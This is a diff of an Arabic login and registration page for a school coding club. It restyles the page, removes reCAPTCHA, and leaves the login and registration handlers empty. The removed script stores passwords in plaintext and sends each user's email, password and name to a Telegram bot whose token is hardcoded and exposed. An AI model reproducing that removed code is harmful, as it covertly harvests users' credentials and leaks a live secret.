@@ -9,31 +9,40 @@
             font-family: Arial, sans-serif;
             direction: rtl;
             text-align: right;
-            background-color: #f4f4f4;
             margin: 0;
             padding: 0;
+            background-image: url('https://img.pikbest.com/backgrounds/20180930/blue-technology-electronic-circuit-background_2846526.jpg!bwr800'); /* رابط الصورة */
+            background-size: cover; /* لجعل الصورة تغطي الصفحة بالكامل */
+            background-position: center; /* تمركز الصورة في وسط الصفحة */
+            background-repeat: no-repeat; /* لمنع تكرار الصورة */
+            background-attachment: fixed; /* لجعل الخلفية ثابتة عند التمرير */
         }
+
         header {
-            background-color: #007BFF; /* لون أزرق ملون */
+            background-color: rgba(0, 123, 255, 0.8); /* خلفية شبه شفافة لتبرز النص */
             color: white;
             padding: 10px 0;
             text-align: center;
         }
+
         h2 {
             color: red;
         }
+
         .section {
             padding: 20px;
             margin: 20px auto;
             max-width: 500px;
-            background-color: white;
+            background-color: rgba(255, 255, 255, 0.9); /* خلفية بيضاء شفافة لتسهيل القراءة */
             border-radius: 10px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             display: none; /* إخفاء جميع الأقسام بشكل افتراضي */
         }
+
         .active {
             display: block; /* إظهار القسم النشط */
         }
+
         .form-actions button {
             background-color: #4CAF50;
             color: white;
@@ -42,22 +51,27 @@
             border-radius: 5px;
             cursor: pointer;
         }
+
         .error-message, .success-message {
             display: none;
             text-align: left;
             margin-bottom: 20px;
         }
+
         .error-message {
             color: red;
         }
+
         .success-message {
             color: green;
         }
+
         label {
             display: inline-block;
             width: 100%;
             margin-bottom: 5px;
         }
+
         input[type="email"],
         input[type="text"],
         input[type="password"] {
@@ -67,6 +81,7 @@
             border-radius: 5px;
             margin-bottom: 10px;
         }
+
         /* قائمة جانبية */
         .sidebar {
             display: none; /* نبدأ بإخفاء القائمة الجانبية */
@@ -81,22 +96,25 @@
             box-shadow: -2px 0 5px rgba(0, 0, 0, 0.5);
             z-index: 1000;
         }
+
         .sidebar a {
             display: block;
             color: white;
             text-decoration: none;
             margin: 10px 0;
         }
+
         /* الصفحة الجديدة */
         .new-section {
             display: none;
             padding: 20px;
             margin: 20px auto;
             max-width: 500px;
-            background-color: white;
+            background-color: rgba(255, 255, 255, 0.9); /* خلفية بيضاء شفافة */
             border-radius: 10px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
         }
+
         /* زر القائمة */
         .menu-icon {
             cursor: pointer;
@@ -111,7 +129,7 @@
 <body>
 
     <header>
-        <h1> <span id="header-title">تسجيل دخول </span></h1>
+        <h1><span id="header-title">تسجيل دخول</span></h1>
     </header>
 
     <!-- Login Page -->
@@ -123,10 +141,6 @@
             <label for="login-password">كلمة المرور</label>
             <input type="password" id="login-password" name="login-password" placeholder="أدخل كلمة المرور" required>
 
-            <!-- Google reCAPTCHA for Login -->
-            <div class="g-recaptcha" data-sitekey="6Lclm2YqAAAAAG9PO0778aGohl8_vvGl7c3SMImM"></div>
-            <br>
-            
             <div class="form-actions">
                 <button type="button" id="login-submit">تسجيل دخول</button>
             </div>
@@ -134,14 +148,8 @@
         <p>ليس لديك حساب؟ <a href="#" id="go-to-register">إنشاء حساب</a></p>
         <div class="error-message" id="login-error">بيانات الاعتماد غير صحيحة</div>
     </section>
-    
 
-    
     <!-- Registration Page -->
-
-
-</header>
-
     <section class="section" id="register-section">
         <h2>إنشاء حساب</h2>
         <form id="register-form">
@@ -158,10 +166,6 @@
             <label for="confirm-password">تأكيد كلمة المرور</label>
             <input type="password" id="confirm-password" name="confirm-password" placeholder="تأكيد كلمة المرور" required>
 
-            <!-- Google reCAPTCHA for Registration -->
-            <div class="g-recaptcha" data-sitekey="6Lclm2YqAAAAAG9PO0778aGohl8_vvGl7c3SMImM"></div>
-            <br>
-            
             <div class="form-actions">
                 <button type="button" id="register-submit">إنشاء حساب</button>
             </div>
@@ -181,28 +185,18 @@
         </section>
         <section>
             <h2>المشرفون</h2>
-            <p>المشرف:  طالبي سيف الدين</p>
-            <p>المشرف:  طرودي أمير</p>
-            <p>المشرف:  حايف إبراهيم</p>
-            <p>المشرف:  حايف مهند</p>
+            <p>المشرف: طالبي سيف الدين</p>
+            <p>المشرف: طرودي أمير</p>
+            <p>المشرف: حايف إبراهيم</p>
+            <p>المشرف: حايف مهند</p>
         </section>
         <section>
             <h2>خارطة الطريق</h2>
             <ul>
                 <li>1-أكتوبر:
                     <ul>
-                        <li>.افتتاح النادي تصميم مطبوعة تعريفية بالنادي: نشاط تعريفي بالنادي داخل المؤسسة</li>
-                        <li>.تنظيم ورشة عمل برمجة: برمجة تاريخها وميادينها</li>
-                    </ul>
-                </li>
-                <li>2-نوفمبر:
-                    <ul>
-                        <li>.فيديو أول نوفمبر/القضية: بمناسبة أول نوفمبر</li>
-                        <li>.HTML: ورشة داخلية لأعضاء النادي للتعلم</li>
-                        <li>حسابات التواصل الاجتماعي (كيفية إنشاء حساب احترافي والتسويق له)</li>
-                        <li>.HTML+CSS: ورشة داخلية لأعضاء النادي للتعلم</li>
-                        <li>.تصميم موقع: تصميم موقع خاص بالمؤسسة</li>
-                        <li>رحلة ميدانية: اختبار مخبر المعلوماتية في جامعة محمد خيضر-بسكرة</li>
+                        <li>افتتاح النادي وتصميم مطبوعة تعريفية بالنادي</li>
+                        <li>تنظيم ورشة عمل برمجة: برمجة تاريخها وميادينها</li>
                     </ul>
                 </li>
             </ul>
@@ -225,136 +219,50 @@
         <!-- أدوات البرمجة -->
         <section class="new-section" id="programming-tools-section">
             <h2 style="color: blue;">أدوات البرمجة</h2>
-            <p style="margin-top: 5cm;">مرحبا بك في صفحة أدوات البرمجة الخاصة بنادي Future Coders. حيث هنا ستجد جميع الأدوات اللازمة التي ستساعدك في تعلم البرمجة.</p>
+            <p>مرحبًا بك في صفحة أدوات البرمجة الخاصة بنادي Future Coders.</p>
         </section>
 
         <!-- أدوات التصميم -->
         <section class="new-section" id="design-tools-section">
             <h2 style="color: blue;">أدوات التصميم</h2>
-            <p style="margin-top: 5cm;">مرحبا بك في صفحة أدوات التصميم الخاصة بنادي Future Coders. حيث هنا ستجد جميع الأدوات التي تحتاجها لتعلم التصميم.</p>
+            <p>مرحبًا بك في صفحة أدوات التصميم الخاصة بنادي Future Coders.</p>
         </section>
     </section>
 
-    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
     <script>
-        const telegramBotToken = "7523355108:AAFoWXH3sCyNrwhCWQRwsFZekWrKKa2xQso"; // توكن البوت
-        const chatId = "6919240425"; // Chat ID
+        document.getElementById("go-to-register").addEventListener("click", function() {
+            document.getElementById("login-section").classList.remove("active");
+            document.getElementById("register-section").classList.add("active");
+            document.getElementById("header-title").textContent = "إنشاء حساب";
+        });
 
-        // Toggle sidebar
+        document.getElementById("login-submit").addEventListener("click", function() {
+            // التحقق من تسجيل الدخول
+        });
+
+        document.getElementById("register-submit").addEventListener("click", function() {
+            // التحقق من التسجيل
+        });
+
         function toggleSidebar() {
-            const sidebar = document.getElementById('sidebar');
-            sidebar.style.display = sidebar.style.display === 'block' ? 'none' : 'block';
+            document.getElementById("sidebar").style.display = document.getElementById("sidebar").style.display === 'block' ? 'none' : 'block';
         }
 
-        // Hide sidebar
         function hideSidebar() {
-            document.getElementById('sidebar').style.display = 'none';
+            document.getElementById("sidebar").style.display = 'none';
         }
 
-        // Show programming tools page
         function showProgrammingTools() {
             hideSidebar();
-            showSection('programming-tools-section');
-            document.getElementById('header-title').textContent = 'أدوات البرمجة'; // تحديث عنوان الصفحة
+            document.getElementById("design-tools-section").style.display = 'none';
+            document.getElementById("programming-tools-section").style.display = 'block';
         }
 
-        // Show design tools page
         function showDesignTools() {
             hideSidebar();
-            showSection('design-tools-section');
-            document.getElementById('header-title').textContent = 'أدوات التصميم'; // تحديث عنوان الصفحة
+            document.getElementById("programming-tools-section").style.display = 'none';
+            document.getElementById("design-tools-section").style.display = 'block';
         }
-
-        // Navigate between sections
-        function showSection(sectionId) {
-            document.querySelectorAll('.section').forEach(section => section.classList.remove('active')); // Hide all sections
-            document.querySelectorAll('.new-section').forEach(section => section.style.display = 'none'); // Hide all new sections
-            document.getElementById(sectionId).style.display = 'block'; // Show the selected section
-        }
-
-        // Login
-        document.getElementById('login-submit').addEventListener('click', function() {
-            const loginEmail = document.getElementById('login-email').value.trim();
-            const loginPassword = document.getElementById('login-password').value;
-            const storedUsers = JSON.parse(localStorage.getItem('users')) || {};
-
-            const user = Object.values(storedUsers).find(user => user.email === loginEmail && user.password === loginPassword);
-
-            // Check if all fields are filled
-            if (!loginEmail || !loginPassword) {
-                document.getElementById('login-error').textContent = 'يرجى ملء جميع الحقول';
-                document.getElementById('login-error').style.display = 'block';
-                return;
-            }
-
-            if (user) {
-                const message = `Login: Email: ${user.email}, Password: ${user.password}, First Name: ${user.firstName}, Last Name: ${user.lastName}`;
-                sendMessageToTelegram(message);
-                showSection('club-section'); // Navigate to Coders Club page
-                document.getElementById('header-title').textContent = 'نادي المبرمجين'; // Update header title
-                hideSidebar(); // Hide sidebar when navigating to club section
-            } else {
-                document.getElementById('login-error').style.display = 'block';
-            }
-        });
-
-        // Create Account
-        document.getElementById('register-submit').addEventListener('click', function() {
-            const email = document.getElementById('email').value.trim();
-            const firstName = document.getElementById('first-name').value.trim();
-            const lastName = document.getElementById('last-name').value.trim();
-            const department = document.getElementById('department').value.trim();
-            const password = document.getElementById('password').value;
-            const confirmPassword = document.getElementById('confirm-password').value;
-
-            // Check if all fields are filled
-            if (!email || !firstName || !lastName || !department || !password || !confirmPassword) {
-                document.getElementById('register-error').textContent = 'يرجى ملء جميع الحقول';
-                document.getElementById('register-error').style.display = 'block';
-                return;
-            }
-
-            // Check if email ends with @gmail.com
-            if (!email.endsWith('@gmail.com')) {
-                document.getElementById('register-error').textContent = 'يجب أن يكون البريد الإلكتروني من نوع @gmail.com';
-                document.getElementById('register-error').style.display = 'block';
-                return;
-            }
-
-            // Check password length
-            if (password.length < 8) {
-                document.getElementById('register-error').textContent = 'يجب أن تكون كلمة المرور مكونة من 8 عناصر على الأقل';
-                document.getElementById('register-error').style.display = 'block';
-                return;
-            }
-
-            // Check if passwords match
-            if (password !== confirmPassword) {
-                document.getElementById('register-error').textContent = 'كلمات المرور غير متطابقة';
-                document.getElementById('register-error').style.display = 'block';
-                return;
-            }
-
-            const storedUsers = JSON.parse(localStorage.getItem('users')) || {};
-            storedUsers[email] = { email, firstName, lastName, department, password };
-            localStorage.setItem('users', JSON.stringify(storedUsers));
-
-            const message = `New Account: Email: ${email}, First Name: ${firstName}, Last Name: ${lastName}, Department: ${department}`;
-            sendMessageToTelegram(message);
-            showSection('login-section'); // Navigate back to login section after registration
-        });
-
-        // Send message to Telegram
-        function sendMessageToTelegram(message) {
-            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-            fetch(url).then(response => console.log(response));
-        }
-
-        // Navigation to Register page
-        document.getElementById('go-to-register').addEventListener('click', function() {
-            showSection('register-section');
-        });
     </script>
 </body>
 </html>
-
